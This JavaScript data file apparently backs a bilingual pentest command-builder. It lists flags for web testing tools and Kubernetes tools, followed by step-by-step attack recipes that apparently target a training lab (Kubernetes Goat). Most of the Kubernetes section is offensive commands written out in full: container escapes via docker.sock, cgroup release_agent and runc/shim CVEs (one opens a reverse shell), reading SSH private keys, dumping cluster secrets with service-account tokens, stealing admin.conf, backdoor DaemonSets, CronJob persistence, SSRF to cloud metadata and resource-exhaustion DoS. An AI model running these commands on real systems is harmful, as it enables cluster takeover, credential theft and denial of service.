      { id:'_no_target_', flag:'(no target)', help: M('No target is set: run the client, get a domain *.oast.pro (oast.live, oast.site, oast.online, oast.fun, oast.me) and put it into the payload', 'No target is set: run the client, get a domain *.oast.pro (oast.live, oast.site, oast.online, oast.fun, oast.me) and put it into the payload') },
      { id:'_n', flag:'-n', help: M('How many payload domains to generate (--number, default 1)', 'How many payload domains to generate (--number, default 1)'), value:'1' },
      { id:'_s', flag:'-s', help: M('Which interactsh server to use; can be your own self-hosted one (--server)', 'Which interactsh server to use; can be your own self-hosted one (--server)'), value:'oast.pro' },
      { id:'_t', flag:'-t', help: M('Authentication token for a protected/own server (--token)', 'Authentication token for a protected/own server (--token)'), value:'TOKEN' },
      { id:'_config', flag:'-config', help: M('Client configuration file', 'Client configuration file'), value:'config.yaml' },
      { id:'_pi', flag:'-pi', help: M('Server poll interval in seconds (--poll-interval, default 5)', 'Server poll interval in seconds (--poll-interval, default 5)'), value:'5' },
      { id:'_sf', flag:'-sf', help: M('Session file: save/read to get the same subdomain back (--session-file)', 'Session file: save/read to get the same subdomain back (--session-file)'), value:'session.txt' },
      { id:'_nf', flag:'-nf', help: M('Disable HTTP fallback on registration (--no-http-fallback)', 'Disable HTTP fallback on registration (--no-http-fallback)') },
      { id:'_kai', flag:'-kai', help: M('Keep-alive interval (--keep-alive-interval)', 'Keep-alive interval (--keep-alive-interval)'), value:'1m' },
      { id:'_dns_only', flag:'-dns-only', help: M('Show only DNS interactions', 'Show only DNS interactions') },
      { id:'_http_only', flag:'-http-only', help: M('Show only HTTP interactions', 'Show only HTTP interactions') },
      { id:'_smtp_only', flag:'-smtp-only', help: M('Show only SMTP interactions', 'Show only SMTP interactions') },
      { id:'_m', flag:'-m', help: M('Show only interactions matching a pattern (--match)', 'Show only interactions matching a pattern (--match)'), value:'admin' },
      { id:'_f', flag:'-f', help: M('Hide interactions matching a pattern (--filter)', 'Hide interactions matching a pattern (--filter)'), value:'favicon' },
      { id:'_asn', flag:'-asn', help: M('Show ASN information for the source IP', 'Show ASN information for the source IP') },
      { id:'_o', flag:'-o', help: M('Save interactions to a file', 'Save interactions to a file'), value:'interactions.txt' },
      { id:'_json', flag:'-json', help: M('Output in JSONL format', 'Output in JSONL format') },
      { id:'_v', flag:'-v', help: M('Verbose mode - show the full request/response', 'Verbose mode - show the full request/response') },
      { id:'_ps', flag:'-ps', help: M('Save the generated payload domains (--payload-store)', 'Save the generated payload domains (--payload-store)') },
      { id:'_psf', flag:'-psf', help: M('File to store the payloads (--payload-store-file)', 'File to store the payloads (--payload-store-file)'), value:'payloads.txt' },
      { id:'_up', flag:'-up', help: M('Update interactsh-client to the latest version (--update)', 'Update interactsh-client to the latest version (--update)') },
      { id:'_version', flag:'-version', help: M('Show the tool version', 'Show the tool version') },
      { id:'_hc', flag:'-hc', help: M('Diagnostic health check (--health-check)', 'Diagnostic health check (--health-check)') },
    ],
  },
  {
    id: 'graphw00f',
    name: 'graphw00f',
    base: 'graphw00f',
    desc: M('GraphQL-аналог wafw00f: находит GraphQL endpoint и какой движок за ним (Apollo, Graphene, graphql-ruby, HyperGraphQL…). По движку понятны атаки и bypass.', 'A GraphQL analog of wafw00f: finds the GraphQL endpoint on a target and determines which implementation exactly sits behind it (Apollo, Graphene, graphql-ruby, HyperGraphQL and others). The engine tells you which attacks and bypasses apply.'),
    targetPlaceholder: '-t {TARGET}',
    flags: [
      { id:'_t', flag:'-t', help: M('Target URL together with the path to check (--target)', 'Target URL together with the path to check (--target)'), value:'{TARGET}' },
      { id:'_d', flag:'-d', help: M('detect mode: find the GraphQL endpoint path by brute-forcing known paths (--detect)', 'detect mode: find the GraphQL endpoint path by brute-forcing known paths (--detect)') },
      { id:'_f', flag:'-f', help: M('fingerprint mode: determine which GraphQL engine is running (--fingerprint)', 'fingerprint mode: determine which GraphQL engine is running (--fingerprint)') },
      { id:'_w', flag:'-w', help: M('Custom wordlist of GraphQL endpoint paths for detect mode (--wordlist)', 'Custom wordlist of GraphQL endpoint paths for detect mode (--wordlist)'), value:'paths.txt' },
      { id:'_l', flag:'-l', help: M('Show the list of all engines it can detect and exit (--list)', 'Show the list of all engines it can detect and exit (--list)') },
      { id:'_u', flag:'-u', help: M('Custom User-Agent (--user-agent)', 'Custom User-Agent (--user-agent)'), value:'Mozilla/5.0' },
      { id:'_h', flag:'-H', help: M('Custom header; can be specified multiple times (--header); cookies go here too', 'Custom header; can be specified multiple times (--header); cookies go here too'), value:'Authorization: Bearer x' },
      { id:'_p', flag:'-p', help: M('HTTP(S) proxy, format http://user:pass@host:port (--proxy)', 'HTTP(S) proxy, format http://user:pass@host:port (--proxy)'), value:'http://127.0.0.1:8080' },
      { id:'_r', flag:'-r', help: M('Do not follow 3xx redirects (--noredirect)', 'Do not follow 3xx redirects (--noredirect)') },
      { id:'_o', flag:'-o', help: M('Write the results to a CSV file (--output-file)', 'Write the results to a CSV file (--output-file)'), value:'result.csv' },
      { id:'_v', flag:'-v', help: M('Show the version and exit (--version)', 'Show the version and exit (--version)') },
    ],
  },
  {
    id: 'python3-smuggler-py',
    name: 'python3 smuggler.py',
    base: 'python3 smuggler.py',
    desc: M('Проверяет endpoint на HTTP Request Smuggling (CL.TE / TE.CL desync). Шлёт мутированные запросы и смотрит, расходятся ли frontend и backend на длине body.', 'Checks an endpoint for HTTP Request Smuggling vulnerabilities (CL.TE / TE.CL desync). Sends a series of mutated requests and determines whether the frontend and backend get out of sync on body-length parsing.'),
    targetPlaceholder: '-u {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('Target URL with the endpoint (--url); or feed the URL via stdin', 'Target URL with the endpoint (--url); or feed the URL via stdin'), value:'{TARGET}' },
      { id:'_v', flag:'-v', help: M('Specify the virtual host - the Host header (--vhost)', 'Specify the virtual host - the Host header (--vhost)'), value:'vhost' },
      { id:'_m', flag:'-m', help: M('HTTP request method (--method, default POST)', 'HTTP request method (--method, default POST)'), value:'POST' },
      { id:'_t', flag:'-t', help: M('Socket timeout in seconds (--timeout, default 5)', 'Socket timeout in seconds (--timeout, default 5)'), value:'5' },
      { id:'_c', flag:'-c', help: M('Mutation/payload configuration file (--configfile, default default.py)', 'Mutation/payload configuration file (--configfile, default default.py)'), value:'default.py' },
      { id:'_x', flag:'-x', help: M('Exit on the first vulnerability found on an endpoint (--exit_early)', 'Exit on the first vulnerability found on an endpoint (--exit_early)') },
      { id:'_q', flag:'-q', help: M('Quiet mode - output only the problems found (--quiet)', 'Quiet mode - output only the problems found (--quiet)') },
      { id:'_l', flag:'-l', help: M('Log file (--log)', 'Log file (--log)'), value:'scan.log' },
      { id:'__no_color', flag:'--no-color', help: M('Disable ANSI colors', 'Disable ANSI colors') },
    ],
  },
  {
    id: 'crlfuzz',
    name: 'crlfuzz',
    base: 'crlfuzz',
    desc: M('Быстрый CRLF injection-сканер на Go. Вставляет переводы строк в URL/заголовки и проверяет split ответа (response splitting / header injection). URL, список или stdin.', 'A fast CRLF injection scanner in Go. Inserts newline control characters into URLs and headers and checks whether the HTTP response can be split (HTTP response splitting / header injection). Works on a single URL, a list or from stdin.'),
    targetPlaceholder: '-u {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('A single URL to fuzz (--url)', 'A single URL to fuzz (--url)'), value:'{TARGET}' },
      { id:'_l', flag:'-l', help: M('File with a list of URLs (--list)', 'File with a list of URLs (--list)'), value:'urls.txt' },
      { id:'_stdin_', flag:'(stdin)', help: M('URLs can be fed via stdin: cat urls.txt | crlfuzz', 'URLs can be fed via stdin: cat urls.txt | crlfuzz') },
      { id:'_x', flag:'-X', help: M('HTTP request method (--method, default GET)', 'HTTP request method (--method, default GET)'), value:'GET' },
      { id:'_d', flag:'-d', help: M('Request body / POST data (--data)', 'Request body / POST data (--data)'), value:'a=1' },
      { id:'_h', flag:'-H', help: M('Custom header; can be specified multiple times (--header)', 'Custom header; can be specified multiple times (--header)'), value:'Cookie: a=b' },
      { id:'_c', flag:'-c', help: M('Concurrency level (--concurrent, default 25)', 'Concurrency level (--concurrent, default 25)'), value:'25' },
      { id:'_s', flag:'-s', help: M('Quiet mode - show only vulnerable targets (--silent)', 'Quiet mode - show only vulnerable targets (--silent)') },
      { id:'_o', flag:'-o', help: M('Save the results to a file (--output)', 'Save the results to a file (--output)'), value:'out.txt' },
      { id:'_v', flag:'-v', help: M('Verbose mode - show errors/details (--verbose)', 'Verbose mode - show errors/details (--verbose)') },
    ],
  },
];

const KUBER_DATA = {
  tools: [
    {
      id: 'kubectl',
      name: 'kubectl',
      base: 'kubectl',
      desc: M('Работа с K8s API: разведка, secret, exec.', 'K8s API: recon, secrets, exec.'),
      targetPlaceholder: 'COMMAND',
      flags: [
        { id:'a', flag:'get all -A', help: M('Все ресурсы во всех NS', 'All resources all NS') },
        { id:'p', flag:'get pods -A', help: M('Поды', 'Pods'), def:true },
        { id:'s', flag:'get secrets -A', help: M('Secrets', 'Secrets') },
        { id:'n', flag:'get nodes -o wide', help: M('Ноды + IP', 'Nodes + IPs') },
        { id:'exec', flag:'exec -it POD -- sh', help: M('Exec в под', 'Exec into pod') },
        { id:'run_h', flag:'run -it --image=madhuakula/hacker-container -- sh', help: M('Run hacker-container', 'Run hacker-container') },
        { id:'sa', flag:'describe sa -n NS', help: M('ServiceAccount', 'ServiceAccount') },
        { id:'cani', flag:'auth can-i --list', help: M('RBAC права', 'RBAC permissions') },
        { id:'apply', flag:'apply -f f.yaml', help: M('Apply manifest', 'Apply manifest') },
        { id:'logs', flag:'logs POD', help: M('Логи', 'Logs') },
        { id:'pf', flag:'port-forward svc/SVC L:R', help: M('Port-forward', 'Port-forward') },
        { id:'crb', flag:'get clusterrolebinding -A', help: M('ClusterRoleBindings', 'ClusterRoleBindings') },
      ],
    },
    {
      id: 'cdk',
      name: 'CDK',
      base: './cdk',
      desc: M('Container Defence Kit: escape и post-exploitation.', 'Container escape + K8s post-exploitation.'),
      targetPlaceholder: 'ACTION',
      flags: [
        { id:'ev', flag:'evaluate --full', help: M('Оценка контейнера', 'Container eval'), def:true },
        { id:'ds', flag:'run docker-sock-pwn /var/run/docker.sock "id"', help: M('Escape docker.sock', 'DIND escape') },
        { id:'cg', flag:'run mount-cgroup "id>/host/tmp/pwn"', help: M('Cgroup release_agent', 'Cgroup escape') },
        { id:'dac', flag:'run cap-dac-read-search /root/.ssh/id_rsa', help: M('CAP_DAC_READ_SEARCH', 'CAP_DAC_READ_SEARCH') },
        { id:'shim', flag:'run shim-pwn reverse LHOST LPORT', help: M('CVE-2020-15257 shim', 'CVE-2020-15257 shim') },
        { id:'runc', flag:'run runc-pwn "id>/tmp/pwn"', help: M('CVE-2019-5736 runc', 'CVE-2019-5736 runc') },
        { id:'secd', flag:'run k8s-secret-dump auto', help: M('Dump secrets', 'Dump secrets') },
        { id:'ds2', flag:'run k8s-backdoor-daemonset default nginx:alpine "id"', help: M('Backdoor DaemonSet', 'Backdoor DaemonSet') },
        { id:'shadow', flag:'run k8s-shadow-apiserver default', help: M('Shadow API server', 'Shadow API server') },
        { id:'etcd', flag:'run etcd-get-k8s-token default https://E:2379', help: M('Токены из etcd', 'Tokens from etcd') },
        { id:'kubexec', flag:'run kubelet-exec exec E/ns/pod/c TOKEN', help: M('Exec через kubelet', 'Exec via kubelet') },
        { id:'cron', flag:'run k8s-cronjob default min nginx:alpine id', help: M('CronJob persistence', 'CronJob persistence') },
        { id:'mitm', flag:'run k8s-mitm-clusterip default nginx:alpine 10.0.0.1 443', help: M('CVE-2020-8554 MITM', 'CVE-2020-8554 MITM') },
      ],
    },
    {
      id: 'crictl',
      name: 'crictl',
      base: 'crictl',
      desc: M('containerd CLI: управление без kubectl.', 'containerd CLI without kubectl.'),
      targetPlaceholder: 'CMD',
      flags: [
        { id:'ps', flag:'ps', help: M('Контейнеры', 'Containers'), def:true },
        { id:'pods', flag:'pods', help: M('Поды', 'Pods') },
        { id:'im', flag:'images', help: M('Образы', 'Images') },
        { id:'exec', flag:'exec -it CID sh', help: M('Exec', 'Exec') },
        { id:'logs', flag:'logs CID', help: M('Логи', 'Logs') },
        { id:'pull', flag:'pull IMAGE', help: M('Pull', 'Pull') },
        { id:'psa', flag:'ps -a', help: M('Все (вкл. stopped)', 'All (incl. stopped)') },
      ],
    },
    {
      id: 'helm-k8s',
      name: 'helm',
      base: 'helm',
      desc: M('Client-side пакетный менеджер Kubernetes: render, review и атомарный rollout charts.', 'Client-side Kubernetes package manager for rendering, reviewing, and atomically rolling out charts.'),
      targetPlaceholder: 'CMD',
      flags: [
        { id:'list', flag:'list', help: M('Релизы', 'Releases'), def:true },
        { id:'template', flag:'template R CHART --values values.yaml', help: M('Render manifests для review', 'Render manifests for review') },
        { id:'lint', flag:'lint CHART --strict', help: M('Строгая проверка chart', 'Strict chart validation') },
        { id:'install', flag:'upgrade --install R CHART --atomic --wait', help: M('Атомарный install/upgrade', 'Atomic install or upgrade') },
        { id:'unin', flag:'uninstall R', help: M('Удалить release', 'Remove release') },
        { id:'radd', flag:'repo add NAME URL', help: M('Add repo', 'Add repo') },
        { id:'rupd', flag:'repo update', help: M('Update repos', 'Update repos') },
      ],
    },
    {
      id: 'k8s-docker',
      name: 'docker',
      base: 'docker',
      desc: M('DIND, registry API, history/inspect образов (секреты в слоях).', 'DIND, registry API, history inspect.'),
      targetPlaceholder: 'CMD',
      flags: [
        { id:'ps', flag:'ps', help: M('Контейнеры', 'Containers'), def:true },
        { id:'im', flag:'images', help: M('Образы', 'Images') },
        { id:'hist', flag:'history --no-trunc IMG', help: M('Слои (секреты!)', 'Layers (secrets!)') },
        { id:'insp', flag:'inspect IMG', help: M('Inspect', 'Inspect') },
        { id:'save', flag:'save IMG -o out.tar', help: M('Save tar', 'Save tar') },
        { id:'priv', flag:'run -it --privileged --pid=host -v /:/host IMG sh', help: M('Privileged run', 'Privileged run') },
        { id:'rcat', flag:'(curl) http://REG/v2/_catalog', help: M('Registry catalog', 'Registry catalog') },
        { id:'rtag', flag:'(curl) http://REG/v2/I/tags/list', help: M('Registry tags', 'Registry tags') },
        { id:'rman', flag:'(curl) http://REG/v2/I/manifests/latest', help: M('Registry manifest', 'Registry manifest') },
      ],
    },
    {
      id: 'k8s-redis',
      name: 'redis-cli',
      base: 'redis-cli',
      desc: M('Internal Redis в K8s.', 'Internal Redis in K8s.'),
      targetPlaceholder: '-h HOST',
      flags: [
        { id:'h', flag:'-h', help: M('Host', 'Host'), value:'10.12.0.2' },
        { id:'k', flag:'KEYS *', help: M('Keys', 'Keys'), def:true },
        { id:'g', flag:'GET K', help: M('Get val', 'Get val') },
        { id:'i', flag:'INFO', help: M('Info', 'Info') },
        { id:'cfg', flag:'CONFIG GET *', help: M('Config', 'Config') },
      ],
    },
    {
      id: 'k8s-zmap',
      name: 'zmap',
      base: 'zmap',
      desc: M('Scan внутренних K8s сетей (10.0.0.0/8).', 'Internal K8s network scan.'),
      targetPlaceholder: '-p PORT NET',
      flags: [
        { id:'r', flag:'-p 6379 10.0.0.0/8', help: M('Redis', 'Redis'), def:true },
        { id:'api', flag:'-p 6443 10.0.0.0/8', help: M('K8s API', 'K8s API') },
        { id:'kub', flag:'-p 10250 10.0.0.0/8', help: M('Kubelet API', 'Kubelet API') },
        { id:'etcd', flag:'-p 2379 10.0.0.0/8', help: M('etcd', 'etcd') },
        { id:'np', flag:'-p 30000-32767 10.0.0.0/8', help: M('NodePort', 'NodePort') },
        { id:'o', flag:'-o r.csv', help: M('Output', 'Output') },
      ],
    },
    {
      id: 'k8s-bench',
      name: 'kube-bench',
      base: 'kube-bench',
      desc: M('CIS Benchmark для K8s.', 'CIS Benchmark for K8s.'),
      targetPlaceholder: 'ARGS',
      flags: [
        { id:'run', flag:'', help: M('Run', 'Run'), def:true },
        { id:'node', flag:'--benchmark node', help: M('Node', 'Node') },
        { id:'mast', flag:'--benchmark master', help: M('Master', 'Master') },
        { id:'j', flag:'--json', help: M('JSON', 'JSON') },
      ],
    },
    {
      id: 'k8s-audit',
      name: 'kubeaudit',
      base: 'kubeaudit',
      desc: M('Аудит подов: привилегии, caps, hostPath.', 'Pod audit: privileges, caps, hostPath.'),
      targetPlaceholder: 'CMD',
      flags: [
        { id:'a', flag:'all', help: M('Full audit', 'Full audit'), def:true },
        { id:'k', flag:'k8s', help: M('K8s API', 'K8s API') },
        { id:'p', flag:'privileged', help: M('Privileged', 'Privileged') },
        { id:'c', flag:'capabilities', help: M('Capabilities', 'Capabilities') },
        { id:'j', flag:'--json', help: M('JSON', 'JSON') },
      ],
    },
    {
      id: 'stress',
      name: 'stress-ng',
      base: 'stress-ng',
      desc: M('DoS: CPU/RAM/disk на поде без лимитов.', 'DoS: CPU/RAM/disk on unlimited pod.'),
      targetPlaceholder: 'ARGS',
      flags: [
        { id:'vm', flag:'--vm 2 --vm-bytes 2G --timeout 30s', help: M('2GB RAM', '2GB RAM'), def:true },
        { id:'cpu', flag:'--cpu 4 --timeout 30s', help: M('4 CPU', '4 CPU') },
        { id:'io', flag:'--io 4 --timeout 30s', help: M('4 I/O', '4 I/O') },
        { id:'hdd', flag:'--hdd 2 --timeout 30s', help: M('2 HDD', '2 HDD') },
      ],
    },
    {
      id: 'k8s-curl',
      name: 'curl (K8s API)',
      base: 'curl',
      desc: M('Запросы к K8s API через SA токен.', 'K8s API via ServiceAccount token.'),
      targetPlaceholder: 'URL',
      flags: [
        { id:'api', flag:'--cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api', help: M('API versions', 'API versions'), def:true },
        { id:'secrets', flag:'--cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets', help: M('List secrets', 'List secrets') },
        { id:'ns_secrets', flag:'--cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets', help: M('Secrets in NS', 'Secrets in NS') },
        { id:'pods', flag:'--cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/pods', help: M('Pods in NS', 'Pods in NS') },
      ],
      note: M('Сначала экспорт: export APISERVER=https://${KUBERNETES_SERVICE_HOST}; export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount; export TOKEN=$(cat ${SERVICEACCOUNT}/token); export CACERT=${SERVICEACCOUNT}/ca.crt', 'First export: export APISERVER=https://${KUBERNETES_SERVICE_HOST}; export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount; export TOKEN=$(cat ${SERVICEACCOUNT}/token); export CACERT=${SERVICEACCOUNT}/ca.crt'),
    },
    {
      id: 'amicontained',
      name: 'amicontained',
      base: 'amicontained',
      desc: M('Показывает в каком контейнере/среде ты находишься: capabilities, cgroups, namespace, AppArmor, Seccomp.', 'Container introspection: capabilities, cgroups, namespace, AppArmor, Seccomp.'),
      targetPlaceholder: '',
      flags: [
        { id:'run', flag:'', help: M('Запуск', 'Run'), def:true },
      ],
    },
    {
      id: 'capsh',
      name: 'capsh',
      base: 'capsh',
      desc: M('Проверка Linux capabilities у контейнера. Первый шаг перед эскалацией привилегий.', 'Check Linux capabilities. First step before privilege escalation.'),
      targetPlaceholder: '',
      flags: [
        { id:'print', flag:'--print', help: M('Показать capabilities', 'Show capabilities'), def:true },
        { id:'decode', flag:'--decode=CAP_ID', help: M('Декодировать capability по номеру', 'Decode cap by number'), value:'CAP_SYS_ADMIN=21' },
      ],
    },
    {
      id: 'popeye',
      name: 'popeye',
      base: 'popeye',
      desc: M('K8s санитайзер: находит misconfigs, уязвимые поды, лишние привилегии, которые можно эксплуатировать.', 'K8s sanitizer: finds misconfigs, vulnerable pods, excess privileges to exploit.'),
      targetPlaceholder: '',
      flags: [
        { id:'run', flag:'', help: M('Запуск (нужен cluster-admin)', 'Run (needs cluster-admin)'), def:true },
        { id:'save', flag:'--save', help: M('Сохранить отчёт', 'Save report') },
        { id:'json', flag:'--json', help: M('JSON вывод', 'JSON output') },
        { id:'out', flag:'-o report.html', help: M('HTML отчёт', 'HTML report') },
      ],
    },
    {
      id: 'nsenter',
      name: 'nsenter',
      base: 'nsenter',
      desc: M('Вход в namespace host: PID, mount, network. Классический container escape.', 'Enter host namespaces: PID, mount, network. Classic container escape.'),
      targetPlaceholder: 'NS_CMD',
      flags: [
        { id:'host', flag:'-t 1 -m --uts --ipc --pid', help: M('Полный доступ к host namespace', 'Full host namespace'), def:true },
        { id:'net', flag:'-t 1 -n', help: M('Только network namespace', 'Network namespace only') },
        { id:'mount', flag:'-t 1 -m', help: M('Только mount namespace', 'Mount namespace only') },
        { id:'pid', flag:'-t 1 -p', help: M('Только PID namespace', 'PID namespace only') },
        { id:'cgroup', flag:'-t 1 -C', help: M('Только cgroup namespace', 'Cgroup namespace only') },
        { id:'cmd', flag:'', help: M('Команда после nsenter', 'Command after nsenter'), value:'bash' },
      ],
    },
    {
      id: 'trufflehog',
      name: 'trufflehog',
      base: 'trufflehog',
      desc: M('Поиск секретов/ключей в git-репозиториях и файлах. Сканирует историю коммитов.', 'Find secrets/keys in git repos and files. Scans commit history.'),
      targetPlaceholder: 'TARGET',
      flags: [
        { id:'git', flag:'git', help: M('Сканировать git репозиторий', 'Scan git repo'), def:true },
        { id:'filesystem', flag:'filesystem', help: M('Сканировать файловую систему', 'Scan filesystem') },
        { id:'s3', flag:'s3', help: M('Сканировать S3 bucket', 'Scan S3 bucket') },
        { id:'json', flag:'--json', help: M('JSON вывод', 'JSON output') },
        { id:'since', flag:'--since-commit COMMIT', help: M('Сканировать с определённого коммита', 'Scan from specific commit') },
        { id:'max_depth', flag:'--max-depth N', help: M('Максимальная глубина коммитов', 'Max commit depth') },
      ],
    },
    {
      id: 'kubescape',
      name: 'kubescape',
      base: 'kubescape',
      desc: M('Сканер безопасности K8s: находит misconfigs по NSA/Kubernetes Hardening Guide.', 'K8s security scanner: finds misconfigs per NSA/Kubernetes Hardening Guide.'),
      targetPlaceholder: 'ARGS',
      flags: [
        { id:'scan', flag:'scan', help: M('Сканировать кластер', 'Scan cluster'), def:true },
        { id:'yaml', flag:'scan --file deploy.yaml', help: M('Сканировать манифест', 'Scan manifest') },
        { id:'framework', flag:'scan --framework nsa', help: M('Фреймворк: nsa, mitre', 'Framework: nsa, mitre') },
        { id:'json', flag:'--format json', help: M('JSON вывод', 'JSON output') },
        { id:'submit', flag:'--submit', help: M('Отправить результаты', 'Submit results') },
      ],
    },
    {
      id: 'dfimage',
      name: 'dfimage',
      base: 'docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage',
      desc: M('Извлекает Dockerfile из слоёв образа через registry. Показывает историю: команды, секреты, ENV.', 'Extracts Dockerfile from image layers via registry. Shows commands, secrets, ENV.'),
      targetPlaceholder: 'IMAGE',
      flags: [
        { id:'run', flag:'', help: M('Извлечь Dockerfile (передать IMAGE после base)', 'Extract Dockerfile (pass IMAGE after base)'), def:true },
        { id:'ver', flag:'-sV=1.36', help: M('Версия API registry', 'Registry API version'), value:'1.36' },
      ],
    },
    {
      id: 'kubeletctl',
      name: 'kubeletctl',
      base: 'kubeletctl',
      desc: M('Клиент kubelet API (10250/10255): pods, exec, run без полного kubectl RBAC.', 'Kubelet API client (10250/10255): pods, exec, run without full kubectl RBAC.'),
      targetPlaceholder: '-s NODE_IP',
      flags: [
        { id:'pods', flag:'pods', help: M('Список подов на ноде', 'List pods on node'), def:true },
        { id:'scan', flag:'scan', help: M('Скан anonymous/readonly kubelet', 'Scan anonymous/readonly kubelet') },
        { id:'exec', flag:'exec -p POD -c CONTAINER -n NS -- sh', help: M('Exec в контейнер через kubelet', 'Exec into container via kubelet') },
        { id:'run', flag:'run -p POD -c CONTAINER -n NS -- id', help: M('Run command via kubelet', 'Run command via kubelet') },
        { id:'metrics', flag:'metrics', help: M('Метрики kubelet', 'Kubelet metrics') },
        { id:'config', flag:'configz', help: M('Конфиг kubelet', 'Kubelet config') },
        { id:'s', flag:'-s', help: M('IP ноды / kubelet', 'Node / kubelet IP'), value:'NODE_IP' },
        { id:'http', flag:'--http', help: M('HTTP вместо HTTPS', 'HTTP instead of HTTPS') },
      ],
    },
    {
      id: 'peirates',
      name: 'peirates',
      base: 'peirates',
      desc: M('Автоматизированный K8s post-exploit: SA tokens, secrets, pods, cloud metadata.', 'Automated K8s post-exploit: SA tokens, secrets, pods, cloud metadata.'),
      targetPlaceholder: '',
      flags: [
        { id:'run', flag:'', help: M('Интерактивный menu (запуск в поде)', 'Interactive menu (run in pod)'), def:true },
        { id:'token', flag:'(menu) List / use SA tokens', help: M('Список/использование SA token', 'List / use SA tokens') },
        { id:'sec', flag:'(menu) Get secrets', help: M('Dump secrets', 'Dump secrets') },
        { id:'pod', flag:'(menu) Run pod / exec', help: M('Создать под / exec', 'Create pod / exec') },
        { id:'aws', flag:'(menu) AWS metadata / IRSA', help: M('Cloud metadata / IRSA', 'Cloud metadata / IRSA') },
        { id:'kubelet', flag:'(menu) Query kubelets', help: M('Опрос kubelet на нодах', 'Query kubelets on nodes') },
      ],
    },
    {
      id: 'kdigger',
      name: 'kdigger',
      base: 'kdigger',
      desc: M('Context discovery из пода: mounts, caps, tokens, escape hints.', 'Context discovery from a pod: mounts, caps, tokens, escape hints.'),
      targetPlaceholder: '',
      flags: [
        { id:'dig', flag:'dig all', help: M('Все проверки', 'All checks'), def:true },
        { id:'gen', flag:'gen', help: M('Сгенерировать admission/pod context', 'Generate admission/pod context') },
        { id:'cap', flag:'dig capabilities', help: M('Только capabilities', 'Capabilities only') },
        { id:'mount', flag:'dig mount', help: M('Только mounts', 'Mounts only') },
        { id:'token', flag:'dig token', help: M('SA token / API', 'SA token / API') },
        { id:'sys', flag:'dig syscalls', help: M('Syscalls / seccomp', 'Syscalls / seccomp') },
      ],
    },
  ],
  attacks: [
    {
      id: 'k8s-rbac-secrets',
      title: M('RBAC misconfig → dump secrets', 'RBAC misconfig → dump secrets'),
      level: 'Intermediate',
      mitre: 'TA0006 (Credential Access)',
      steps: [
        { t: M('Получить SA токен в поде', 'Get SA token in pod'), c: 'cd /var/run/secrets/kubernetes.io/serviceaccount/ && ls -la' },
        { t: M('Экспорт переменных', 'Export variables'), c: 'export APISERVER=https://${KUBERNETES_SERVICE_HOST}; export TOKEN=$(cat ${SERVICEACCOUNT}/token); export CACERT=${SERVICEACCOUNT}/ca.crt' },
        { t: M('Проверить API доступ', 'Check API access'), c: 'curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets' },
        { t: M('Извлечь secrets с grep', 'Extract secrets with grep'), c: 'curl --cacert ${CACERT} -H "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets | grep k8s' },
        { t: M('Decode base64', 'Decode base64'), c: 'echo "FLAG_BASE64" | base64 -d' },
      ],
    },
    {
      id: 'k8s-priv-escape',
      title: M('Privileged container → host escape', 'Privileged container → host escape'),
      level: 'Advanced',
      mitre: 'TA0004 (Privilege Escalation)',
      steps: [
        { t: M('Проверить capabilities', 'Check capabilities'), c: 'capsh --print' },
        { t: M('Смонтировать hostFS', 'Mount hostFS'), c: 'ls /host-system/; chroot /host-system bash' },
        { t: M('Забрать kubeconfig', 'Steal kubeconfig'), c: 'cat /etc/kubernetes/admin.conf' },
        { t: M('Полный доступ к кластеру', 'Full cluster access'), c: 'kubectl --kubeconfig /etc/kubernetes/admin.conf get nodes' },
        { t: M('Dump etcd / все secrets', 'Dump etcd / all secrets'), c: 'kubectl --kubeconfig /etc/kubernetes/admin.conf get secrets -A' },
      ],
    },
    {
      id: 'k8s-dind-escape',
      title: M('DIND (docker.sock) → host', 'DIND (docker.sock) → host'),
      level: 'Advanced',
      mitre: 'TA0004 (Privilege Escalation)',
      steps: [
        { t: M('Найти сокет', 'Find socket'), c: 'ls -la /var/run/docker.sock' },
        { t: M('Запустить привилегированный контейнер', 'Run privileged container'), c: 'docker run -it --privileged --pid=host -v /:/host IMAGE sh' },
        { t: M('Chroot на host', 'Chroot to host'), c: 'chroot /host bash' },
        { t: M('CRI tools through containerd', 'CRI tools via containerd'), c: 'crictl -r unix:///custom/containerd/containerd.sock images; crictl -r unix:///custom/containerd/containerd.sock pods' },
      ],
    },
    {
      id: 'k8s-ssrf',
      title: M('SSRF → internal services', 'SSRF → internal services'),
      level: 'Intermediate',
      mitre: 'TA0001 (Initial Access)',
      steps: [
        { t: M('Найти SSRF точку', 'Find SSRF point'), c: '?url= param or webhook' },
        { t: M('K8s metadata', 'K8s metadata'), c: 'http://metadata-db' },
        { t: M('Secrets from metadata', 'Secrets from metadata'), c: 'http://metadata-db/latest/secrets/kubernetes-goat' },
        { t: M('Service discovery', 'Service discovery'), c: 'http://SERVICE_NAME.namespace' },
        { t: M('Cloud IMDS', 'Cloud IMDS'), c: 'http://169.254.169.254/' },
      ],
    },
    {
      id: 'k8s-nodeport',
      title: M('NodePort exposure → internal', 'NodePort exposure → internal'),
      level: 'Newbie',
      mitre: 'TA0007 (Discovery)',
      steps: [
        { t: M('Список нод и внешних IP', 'List nodes and external IPs'), c: 'kubectl get nodes -o wide' },
        { t: M('Сканировать NodePort range', 'Scan NodePort range'), c: 'nc -zv EXTERNAL-IP 30003; zmap -p 30000-32767 10.0.0.0/8' },
        { t: M('Найти открытый сервис', 'Find exposed service'), c: 'curl http://EXTERNAL-IP:30003' },
      ],
    },
    {
      id: 'k8s-private-registry',
      title: M('Private registry → image leak', 'Private registry → image leak'),
      level: 'Intermediate',
      mitre: 'TA0009 (Collection)',
      steps: [
        { t: M('Registry API v2', 'Registry API v2'), c: 'curl http://127.0.0.1:1235/v2/' },
